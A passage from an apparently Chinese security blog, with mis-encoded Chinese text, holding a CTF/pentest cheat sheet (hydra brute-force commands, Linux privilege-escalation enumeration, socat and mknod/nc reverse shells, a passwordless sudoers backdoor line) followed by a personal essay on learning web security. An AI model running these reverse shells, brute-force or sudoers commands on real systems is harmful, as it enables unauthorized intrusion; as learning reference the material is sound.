<p>å·¥å…·ä»‹ç»ï¼šè¿™æ¬¾æš´åŠ›å¯†ç ç ´è§£å·¥å…·ç›¸å½“å¼ºå¤§ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰åè®®çš„åœ¨çº¿å¯†ç ç ´è§£ï¼Œå…¶å¯†ç èƒ½å¦è¢«ç ´è§£å…³é”®åœ¨äºå­—å…¸æ˜¯å¦è¶³å¤Ÿå¼ºå¤§ã€‚</p>
<p>è¯¦ç»†ä½¿ç”¨æ–¹å¼ï¼š<a href="https://www.cnblogs.com/zhaijiahui/p/8371336.html">https://www.cnblogs.com/zhaijiahui/p/8371336.html</a></p>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<p><strong>Webç™»å½• GETæ–¹å¼</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get &#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p><strong>Webç™»å½• POSTæ–¹å¼</strong></p>
<p><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/</a></p>
<h2 id="æ•°å­—å–è¯">æ•°å­—å–è¯</h2>
<h3 id="Steghide">Steghide</h3>
<p>ä½¿ç”¨æ‰‹å†Œï¼š<a href="http://steghide.sourceforge.net/documentation/manpage.php">http://steghide.sourceforge.net/documentation/manpage.php</a></p>
<p>å¸¸ç”¨å‘½ä»¤ï¼š</p>
<p>éšå†™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide embed -cf picture.jpg -ef secret.txt</span><br></pre></td></tr></table></figure>
<p>æå–ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf picture.jpg</span><br></pre></td></tr></table></figure>
<h3 id="exiftool">exiftool</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/exiftool/exiftool">https://github.com/exiftool/exiftool</a></p>
<p>ä½¿ç”¨æ‰‹å†Œï¼š<a href="https://www.jianshu.com/p/d76457799de1">https://www.jianshu.com/p/d76457799de1</a></p>
<h2 id="ææƒè„šæœ¬">ææƒè„šæœ¬</h2>
<h3 id="LinEnum">LinEnum</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š<code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</code></p>
<p>å‚æ•°ï¼š</p>
<ul>
<li>-k Enter keyword</li>
<li>-e Enter export location</li>
<li>-t Include thorough (lengthy) tests</li>
<li>-s Supply current user password to check sudo perms (INSECURE)</li>
<li>-r Enter report name</li>
<li>-h Displays this help text</li>
</ul>
<p>Running with no options = limited scans/no output file</p>
<ul>
<li>-e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created.</li>
<li>-r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory.</li>
<li>-t Performs thorough (slow) tests. Without this switch default â€˜quickâ€™ scans are performed.</li>
<li>-s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use!</li>
<li>-k An optional switch for which the user can search for a single keyword within many files (documented below).</li>
</ul>
<h3 id="pspy">pspy</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<p>é¡¹ç›®ä»‹ç»ï¼špspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
<h2 id="ææƒå‘½ä»¤">ææƒå‘½ä»¤</h2>
<ul>
<li>
<p>Find World Writable Folders</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -xdev -type d -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find World Writable Files</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -xdev -type f -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find SUIDs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find SGID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -2000 -group root -exec ls -ld &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>DIstro Information</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*-release</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check open ports</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -antup</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check processes</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -elf</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Process monitoring tool: <a href="https://github.com/DominicBreuker/pspy">pspy</a></p>
<ul>
<li>Useful for monitoring chron jobs or any other scheduled jobs</li>
</ul>
</li>
<li>
<p>Check processes running with root privileges</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -elf | grep root</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check running services</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;services</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check installed packages</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check for sudo permissions</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check OS architecture</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check cronjobs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check fstab</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;fstab</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check network configuration</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check contents of <code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Using socat</p>
<ul>
<li>
<p>Listen</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Connect</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>Reverse connection using mknod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod &#x2F;tmp&#x2F;backpipe p; &#x2F;bin&#x2F;sh 0&lt; &#x2F;tmp&#x2F;backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt; &#x2F;tmp&#x2F;backpipe; rm &#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check version of an installed application</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l &lt;application name&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Sometimes checking <code>/opt</code> <code>/tmp</code> <code>/var</code> <code>/usr</code> might help.</p>
</li>
<li>
<p>Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Reverse-Shell">Reverse Shell</h2>
<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<h2 id="å¸¸ç”¨å·¥å…·">å¸¸ç”¨å·¥å…·</h2>
<h3 id="SQLMAP">SQLMAP</h3>
<p><a href="https://zerokeeper.com/web-security/sqlmap-usage-summary.html#">https://zerokeeper.com/web-security/sqlmap-usage-summary.html#</a></p>
<p><a href="https://louisnie.github.io/2019/03/03/SQLMAP/">https://louisnie.github.io/2019/03/03/SQLMAP/</a></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>Linux Enumeration</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©</title>
    <url>/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9/</url>
    <content><![CDATA[<h1 id="ä»0åˆ°100åˆ†çš„å­¦ä¹ å¿ƒå¾—">ä»0åˆ°100åˆ†çš„å­¦ä¹ å¿ƒå¾—</h1>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ca01hï¼Œä»Šå¹´8æœˆä»½åŠ å…¥äº†ä¿¡å®‰ä¹‹è·¯å°ç™½æˆé•¿è®¡åˆ’ï¼Œ5ä¸ªæœˆçš„æ—¶é—´è¿‡å»ï¼Œå¾ˆæ„å¤–åœ°æˆä¸ºäº†ç¾¤é‡Œç¬¬ä¸€ä¸ªåˆ°è¾¾100åˆ†çš„ç”·äººã€‚çº¸é¢ä¸Šæ¥çœ‹æ˜¯0åˆ°100åˆ†çš„å˜åŒ–ï¼Œè€Œå¯¹æˆ‘è‡ªå·±è€Œè¨€ï¼Œæ„å‘³ç€ç»ˆäºè·¨å…¥äº†Webå®‰å…¨çš„é¢†åŸŸï¼Œä¹Ÿç®—æ˜¯èå…¥äº†ä¸€ä¸ªå®‰å…¨çš„åœˆå­ã€‚ä¸æ­¤åŒæ—¶ï¼Œå¾ˆè£å¹¸æ¥åˆ°è‰¯å“¥çš„é‚€è¯·ï¼Œä¸ºå¹³å°çš„å…¶ä»–å°ä¼™ä¼´ä»¬å†™ä¸€å†™è¿™å‡ ä¸ªæœˆå­¦ä¹ æˆé•¿è¿‡ç¨‹æœŸé—´çš„ç»éªŒä¹‹è°ˆï¼Œåˆšå¥½æˆ‘ä¹Ÿå‡†å¤‡ç»™è‡ªå·±åšä¸€ä¸ªé˜¶æ®µæ€§çš„æ€»ç»“ä»¥åŠå¯¹æœªæ¥çš„çŸ­æœŸè§„åˆ’ï¼Œé‚æ¬£ç„¶æ¥å—ã€‚ä½†çœŸæ­£åˆ°äº†æç¬”æ’°æ–‡çš„æ—¶å€™ï¼Œé™¤äº†å…´å¥‹ä¹‹å¤–äº¦æœ‰äº›æƒ¶æï¼Œæƒ¶ææ˜¯å› ä¸ºæ„Ÿè§‰è‡ªå·±èµ„è´¨å°šæµ…ä¸è¶³ä»¥æ”¯æ’‘ä¸€ç¯‡ç»éªŒè´´ï¼Œç›´ç™½ç‚¹å°±æ˜¯å¤ªèœäº†ï¼Œè¿˜æœ‰å¤ªå¤šå¤ªå¤šçš„çŸ¥è¯†é¢ã€æŠ€èƒ½è¡¨ã€å¥‡æŠ€æ·«å·§éœ€è¦æŒ–æ˜å’Œå­¦ä¹ ï¼Œä½†æ—¢ç„¶å·²ç»ç­”åº”äº†è‰¯å“¥ï¼Œæ— è®ºå¦‚ä½•ç¡¬ç€å¤´çš®éƒ½è¦å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚å½“ç„¶ï¼Œè¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯é¢å‘å¹³å°çš„å…¶ä»–å°ä¼™ä¼´ä»¬ï¼Œæœ›å€Ÿæ‹™ç¬”æµ…æ–‡ï¼Œä¸å¤§å®¶åˆ†äº«ã€‚</p>
<p>4ä¸ªå¤šæœˆçš„æ—¶é—´100åˆ†ï¼Œå®Œæˆ11ä¸ªä»»åŠ¡ï¼Œå¹³å‡ä¸‹æ¥æ¯ä¸ªä»»åŠ¡å¾—9åˆ†å·¦å³ï¼Œä¹Ÿåªèƒ½æ˜¯ä¸­è§„ä¸­çŸ©å§ï¼Œä¸ç®—ä¼˜ç§€ã€‚ç°åœ¨å›æƒ³èµ·æ¥ï¼Œåšå‰é¢å‡ ä¸ªä»»åŠ¡çš„æ—¶å€™è¿˜æ²¡æœ‰æ‘¸åˆ°é—¨é“ï¼Œæ˜¯æ¯”è¾ƒç®€å•æœºæ¢°çš„æ¬è¿å·¥ï¼Œç»è¿‡å‡ ä¸ªæœˆçš„å­¦ä¹ ç®—æ˜¯æœ‰ç‚¹ä¸Šé“äº†ï¼Œæœ‰äº†è‡ªå·±çš„å®è·µæ“ä½œï¼ŒåŠ ä¸Šäº†è‡ªå·±å¯¹è¿™ä¸ªç±»å‹æ¼æ´çš„ç†è§£å’Œæ€»ç»“ã€‚åˆ°äº†åé¢ç»å¸¸ä¸¤ä¸ªæ˜ŸæœŸæ‰èƒ½å®Œæˆä¸€ä¸ªæŠ¥å‘Šï¼Œä¼šåœ¨äº‘æœåŠ¡å™¨ä¸Šè‡ªå·±æ­å»ºçš„æ¼æ´ç¯å¢ƒå› ä¸ºæŸä¸ªé—®é¢˜è€Œçº ç¼ åŠå¤©ï¼Œä¹Ÿä¼šä¸ºäº†å¤§ç‰›çš„åšå®¢ä¸Šè½»è½»å¸¦è¿‡çš„ä¸€å¥è¯è€Œæ·±ç©¶èƒŒåçš„åŸç†ã€‚æ˜¯çš„ï¼Œä¸€ç¯‡æŠ¥å‘Šä¸ä»…ä»…æ˜¯æ—¶é—´å †ç Œå‡ºæ¥çš„ï¼Œæ›´éœ€è¦ç”¨å¿ƒå»ä¹¦å†™å’Œç†è§£ï¼Œç”¨æ‰‹å»åšå®éªŒå¾—ç»“æœã€‚å°±æ‹¿æœ€è¿‘ä¸€ç¯‡å…³äºSSRFæ¼æ´çš„æŠ¥å‘Šæ¥è¯´ï¼Œæˆ‘é¦–å…ˆä»ã€ŠWebå®‰å…¨æ”»é˜²ã€‹è¿™æœ¬ä¹¦å‡ºå‘ï¼Œåªæœ‰å¯¥å¯¥æ•°é¡µï¼Œæ¯”è¾ƒç²—ç•¥çš„è®²äº†å®ƒçš„åŸç†ã€å¯åˆ©ç”¨çš„åœ°æ–¹ä»¥åŠç®€å•çš„ä»£ç åˆ†æï¼Œçœ‹å®Œä¹‹åæ„çŠ¹æœªå°½æ„Ÿè§‰è¿œè¿œä¸å¤Ÿï¼Œäºæ˜¯Googleæ‰¾åˆ°äº†<a href="https://www.evi1.cn/post/ssrf/">ä¸€ç¯‡æ–‡ç« </a>ï¼Œè¿™ä¸ªåšæ–‡ç›¸å¯¹äºä¹¦ç±æ¥è¯´å·²ç»å¾ˆå……å®äº†ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶ã€åˆ©ç”¨æ–¹å¼ã€å®é™…åˆ©ç”¨ã€Bypassç­‰ç­‰éƒ½æ¯”è¾ƒè¯¦ç»†ï¼Œå¯¹äºæˆ‘æ¥è¯´æ¬£å–œä¸å·²ï¼Œé‚è®¤çœŸå“è¯»èµ·æ¥ï¼Œçœ‹å®Œè¿™ç¯‡æ–‡ç« ç¡®å®ç»™äº†æˆ‘ä¸€ä¸ªå¯¹äºSSRFæ¼æ´æ¯”è¾ƒå…¨é¢çš„è®¤çŸ¥ã€‚ä½†å®è·µå‡ºçœŸçŸ¥ï¼Œåˆ°æˆ‘çœŸæ­£å»å¤ç°ä¸€äº›ç»†èŠ‚çš„æ—¶å€™ï¼Œä¸Šé¢å´æ²¡æœ‰æåˆ°å¤ªå¤šï¼Œæœ‰çš„ç”šè‡³ä¸€ç¬”å¸¦è¿‡ï¼Œä½†æˆ‘è‚¯å®šä¸èƒ½å°±æ­¤æ•·è¡è¿‡å»ï¼Œåˆæ‰¾äº†å¾ˆå¤šå…¶ä»–çš„èµ„æ–™ï¼Œä¸æ–­åœ°æ‰©å……è‡ªå·±çš„æŠ¥å‘Šçš„ç»†èŠ‚ï¼Œè§£å†³é—®é¢˜çš„æ–¹æ³•è‚¯å®šä¸æ­¢ä¸€ç§ï¼Œæœ‰çš„æ˜¯ç”¨ç°æˆå·¥å…·å’Œå‘½ä»¤æ¥ç”Ÿæˆpayloadï¼Œè€Œæœ‰çš„æ˜¯è‡ªå·±æˆªè·æµé‡ç»è¿‡ä¸€ç³»åˆ—æ‰‹æ®µæ¥æ„é€ payloadã€‚å¹¶ä¸æ˜¯è¯´ç›´æ¥ç”¨å·¥å…·ä¸å¥½ï¼Œè€Œæ˜¯å¯¹è‡ªå·±çš„æˆé•¿ä½œç”¨ä¸å¤§ï¼Œå¯ä»¥ä½œä¸ºå‚è€ƒï¼Œä½†ç»éæœ€ä¼˜ã€‚å½“ç„¶ï¼Œæˆ‘è‡ªå·±è¿˜æ˜¯è§‰å¾—ä¹‹å‰åšçš„è¿˜æ˜¯æœ‰äº›ä¸è¶³ï¼Œæ¯”å¦‚ç¼ºå°‘ä¸€äº›æ¼æ´çš„å®ä¾‹ï¼Œå°±æ‹¿SSRFæ¥è¯´ï¼Œæˆ‘æœ€è¿‘çœ‹åˆ°ä¸€ç¯‡æ–‡ç« <a href="https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437">Vimeo upload function SSRF</a>ï¼Œæ‰“ç®—åŠ¨æ‰‹æ¥è¯•ä¸€è¯•ï¼Œä¹Ÿç®—æ˜¯å†ä¸€æ¬¡åŠ æ·±å°è±¡å’Œç†è§£ã€‚æ€»çš„æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªåˆå­¦è€…è€Œè¨€ï¼Œå­¦ä¹ æ— éå°±æ˜¯å‘ç°é—®é¢˜ã€æŸ¥æ‰¾é—®é¢˜ã€è§£å†³é—®é¢˜ï¼Œæœ€åçš„ç»“æœå–å†³äºè¿™ä¸ªè¿‡ç¨‹ï¼Œè€Œè¿™ä¸ªè¿‡ç¨‹åˆå–å†³äºä½ å¯¹å®ƒçš„æ€åº¦ã€‚</p>
<p>ä¸Šé¢ç®€å•çš„è°ˆäº†ä¸€ä¸‹è¿™æ®µæ—¶é—´æˆ‘åœ¨å†™æŠ¥å‘Šæ—¶å€™çš„ä¸€äº›æ„Ÿå—å’Œæƒ³æ³•ï¼Œæ—¢ç„¶ä½œä¸ºåˆ†äº«ï¼Œæˆ‘å°±æƒ³åˆ†äº«çš„æ›´ä¸ºæè‡´ä¸€äº›ï¼Œæ¥ç€è¯´ä¸€è¯´æˆ‘è‡ªå·±ç›®å‰å­¦ä¹ æœŸé—´çš„ä¸€äº›æ–¹æ³•è®ºã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘è®¤ä¸ºéœ€è¦ä¸€ä¸ªçŸ¥è¯†åº“ã€‚ç°åœ¨æ˜¯ç¢ç‰‡åŒ–æ—¶ä»£ï¼Œç”Ÿæ´»ä¸­å……æ–¥ç€ç¢ç‰‡åŒ–çš„æ—¶é—´ã€ç¢ç‰‡åŒ–çš„å†…å®¹ã€ç¢ç‰‡åŒ–çš„çŸ¥è¯†ç­‰ç­‰ï¼Œè¿™è®©æˆ‘ä»¬æ²¡æœ‰å¤§æ®µçš„ä¸“æ³¨æ—¶é—´ï¼Œä¸€ç§æ¯”è¾ƒå¥½çš„è§£å†³æ–¹å¼æ˜¯ä½“ç³»åŒ–ã€æ–‡æ¡£åŒ–ã€æ•°å­—åŒ–æ¢³ç†å’Œæ€»ç»“çŸ¥è¯†ï¼Œç®¡ç†å­¦ä¹ ï¼ŒåŠ æ·±ç†è§£ã€‚æ¯”å¦‚æˆ‘è‡ªå·±æ­äº†ä¸€ä¸ªç®€å•çš„<a href="http://ca0y1h.top/">ä¸ªäººWikiç½‘ç«™</a>ï¼Œç”¨æ¥æ”¶å½•æ•´ç†æ–‡ç« ï¼Œåˆ†å—ç®¡ç†ï¼Œä¾¿äºæŸ¥é˜…æ¸©æ•…ã€‚ä¹Ÿå¹¶ä¸æ˜¯è¯´éè¦æ­å»ºä¸€ä¸ªåšå®¢ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå¯ä»¥åˆ†äº«è®°å½•çš„ç½‘ç«™ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œæ–‡æ¡£åŒ–ç³»ç»ŸåŒ–æ˜¯ç”¨æ¥è®°å½•ç¢ç‰‡åŒ–æ—¶é—´çš„æ‰€å­¦æ‰€æ€æœ€å¥½çš„åŠæ³•ã€‚</p>
<p>å…¶æ¬¡ï¼Œè®¡ç®—æœºè¿™é—¨å­¦ç§‘æ—¥ç›Šæ›´æ–°ï¼Œä¿¡å®‰å°¤å…¶å¦‚æ­¤ï¼Œè™½ç„¶ä½œä¸ºåˆå­¦è€…ï¼Œä½†æˆ‘è¿˜æ˜¯è§‰å¾—è¦æ¥è§¦ä¸€äº›å‰æ²¿çš„çŸ¥è¯†å’Œæ–°é—»ï¼Œè¿™æ ·æ‰èƒ½åœ¨å­¦ä¹ åŸç†çš„æ—¶å€™èƒ½ä¸Šæ‰‹ä½“éªŒä¸€ä¸‹çœŸå®æ¡ˆä¾‹ã€‚æˆ‘æ¨èå‡ ä¸ªæˆ‘ä¸ªäººæ­£åœ¨ä½¿ç”¨çš„ä¿¡æ¯æºï¼Œä¸€æ˜¯è…¾è®¯ç„æ­¦å®éªŒå®¤å’Œå¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤ï¼Œå®ƒä»¬æ¯å¤©éƒ½ä¼šåˆ†äº«æ¯”è¾ƒæ–°æ¯”è¾ƒä¼˜ç§€çš„æ–‡ç« ï¼ŒåŒ…æ‹¬å…·ä½“æŠ€æœ¯ã€æœ€æ–°æ¼æ´ã€æ¶æ„ä»£ç ã€å·¥å…·ä½¿ç”¨ç­‰ç­‰ï¼Œä¸Šé¢æåˆ°çš„é‚£ç¯‡å…³äºVimeoçš„SSRFä¸Šä¼ æ¼æ´å°±æ˜¯å‰å‡ å¤©æµè§ˆçœ‹åˆ°çš„ã€‚æˆ‘è§‰å¾—è¿™ç§å½¢å¼è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œä¹Ÿä¸ç”¨å…¨ç›˜æ¥æ”¶ï¼Œæ¯”è¾ƒé«˜æ•ˆåœ°è·å–çŸ¥è¯†ï¼Œå°±çœ‹çœ‹æ˜¯å¦æœ‰å…³äºè‡ªå·±æ­£åœ¨åšçš„å·¥ä½œçš„æ–‡ç« æˆ–è€…æ„Ÿå…´è¶£çš„çŸ¥è¯†ç‚¹ï¼Œè®°å½•ä¸‹æ¥ã€‚æ­¤å¤–ï¼Œå¤§ä½¬çš„åšå®¢ä¹Ÿå¯ä»¥æ—¶å¸¸å…³æ³¨ï¼Œæ¯”å¦‚è¯´Pç‰›ã€c0ny1ã€Knownsecã€404 not foundç­‰ç­‰ç­‰ï¼Œå†æ­¤å°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚é‚£ä¹ˆæœ‰çš„åŒå­¦å°±ä¼šé—®ï¼Œéœ€è¦æ¯å¤©å»ä»–ä»¬çš„åšå®¢æµè§ˆä¸€éçœ‹æœ‰æ²¡æœ‰å‘æ–°æ–‡ç« å—ï¼Ÿå…¶å®ä¹Ÿç”¨ä¸ç€ï¼ŒChromeæœ‰ä¸€ä¸ªæ‰©å±•æ’ä»¶å«RSS Feed Readerç”¨æ¥æ•´åˆRSSè®¢é˜…ï¼Œå¦‚æœå‘å¸ƒäº†æ–°æ–‡ç« å®ƒå°±ä¼šæœ‰ç›¸åº”çš„æé†’ï¼Œå¾ˆæ–¹ä¾¿ã€‚</p>
<p>å†è€…ï¼ŒCTFç¡®å®æ˜¯å­¦ä¹ Webå®‰å…¨çš„å¥½é€”å¾„ã€‚æˆ‘åœ¨11æœˆä»½çš„æ—¶å€™å’Œå¾ˆå‰å®³çš„å¸ˆå…„ä¸€èµ·å‚åŠ äº†æ ¡èµ›NCTFï¼Œè™½ç„¶è¢«è™å‡ºç¿”äº†ï¼Œè¿™ä¸ªç»å†å›æƒ³èµ·æ¥ä¹Ÿå¾ˆå¿ƒç—›ï¼Œä½†åœ¨æ‰“æ¯”èµ›çš„æ—¶å€™è§£å‡ºé¢˜ç›®æ˜¯å­¦ä¹ æ–°çŸ¥è¯†çš„æœ€å¤§åŠ¨åŠ›ï¼Œä¹Ÿæ˜¯æ£€éªŒè‡ªå·±èƒ½åŠ›çš„ä¸€ç§æ–¹å¼ã€‚è‡³äºå…³äºCTFæ–¹é¢ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è®²äº†ï¼Œæ˜Ÿçƒä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºCTFçš„æ–‡ç« ï¼Œéƒ½å¯ä»¥å‚è€ƒå‚è€ƒã€‚</p>
<p>è¿™åŠå¹´æ¥çš„å­¦ä¹ ç»éªŒä¹Ÿå·®ä¸å¤šè¨€å°½äºæ­¤äº†ã€‚ç°åœ¨æƒ³æƒ³è‡ªå·±ä¸ºä»€ä¹ˆå¤´é“ä¸¤æ¬¡è€ƒç ”éè¦é€‰æ‹©è¿™ä¸€è¡Œï¼Œåå€’æœ‰äº›é“ä¸æ¸…åŸå› äº†ã€‚æœ¬ç§‘çš„æ—¶å€™ä¹Ÿæ˜¯åšä¿¡å®‰çš„ï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯æ”¾åœ¨äº†Linuxç³»ç»Ÿå†…æ ¸å®‰å…¨åŠ å›ºæ–¹é¢ï¼Œä¹Ÿåšå‡ºäº†äº›ä¸œè¥¿é¡ºå¸¦æ‹¿äº†ä¸ªå›½å¥–ã€‚å¯èƒ½æ˜¯æ„Ÿè§‰åº•å±‚è¿™ä¸€å—è¿˜æ˜¯ä¸å¤ªé€‚åˆæˆ‘ï¼Œæœ‰äº›åŠ›ä¸ä»å¿ƒäº†ï¼Œæˆ–è€…è§‰å¾—è¿™ä¸ªæ–¹å‘çš„å°±ä¸šé¢å¤ªçª„äº†ï¼Œå½“æ—¶æ°å¥½æœ‰ä¸€ä½å­¦é•¿æ˜¯æwebå®‰å…¨çš„ï¼Œåœ¨æˆ‘é¢å‰æ¼”ç¤ºäº†ä¸€æŠŠæ‹¿åˆ°æŸä¸ªåå°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼Œçœ‹ç€ä»–æ‰“äº†å‡ åœºCTFæ¯”èµ›ï¼Œä¹Ÿè®¸çœŸçš„æ˜¯å…´è¶£ä½¿ç„¶ï¼Œæ°å¥½åˆ°äº†è€ƒç ”çš„å‡†å¤‡çš„é˜¶æ®µï¼Œäºæ˜¯å°±ä¸‹å®šå†³å¿ƒè¯»ç ”è½¬Webå®‰å…¨æ–¹å‘ã€‚è™½ç„¶æœ‰äº›åå·ï¼Œç°åœ¨ä¹Ÿç®—æ˜¯ååœ¨è¿™ä¸ªä½ç½®ä¸Šäº†ï¼Œä½†ä¹Ÿæ­£æ˜¯åˆ°äº†æ›´é«˜çš„å¹³å°ä¸Šï¼Œæ‰å‘ç°è‡ªå·±å…¥è¡Œå¤ªæ™šäº†ã€‚ç›¸æ¯”è€Œè¨€ï¼Œå­¦å¼Ÿå­¦å¦¹ä»¬å¤§ä¸€å¤§äºŒå°±å…¥äº†é—¨ï¼Œä¼˜ç§€ä¸€ç‚¹çš„éƒ½å·²ç»æ‹¿äº†ä¸å°‘çº¿ä¸‹æ”»é˜²å¤§èµ›çš„ä¸€ç­‰å¥–ã€ç¬¬ä¸€åï¼Œæš‘å‡å»å¤§å‚å®ä¹ ã€‚åƒæˆ‘è¿™ç§å¤§é¾„é€‰æ‰‹å·²ç»æ²¡æ³•æ¯”äº†ï¼Œè‡ªå·±åœ¨å­¦ä¹ çš„æ—¶å€™åˆ«äººä¹Ÿåœ¨å­¦ï¼Œå”¯ä¸€çš„é€‰æ‹©å°±æ˜¯èŠ±æ›´å¤šçš„æ—¶é—´ï¼Œä¸‹æ›´å¤§çš„åŠŸå¤«ã€‚è®²çœŸï¼Œè™½è¯´é—æ†¾ï¼Œä½†ä¹Ÿæ— æ‚”ã€‚</p>
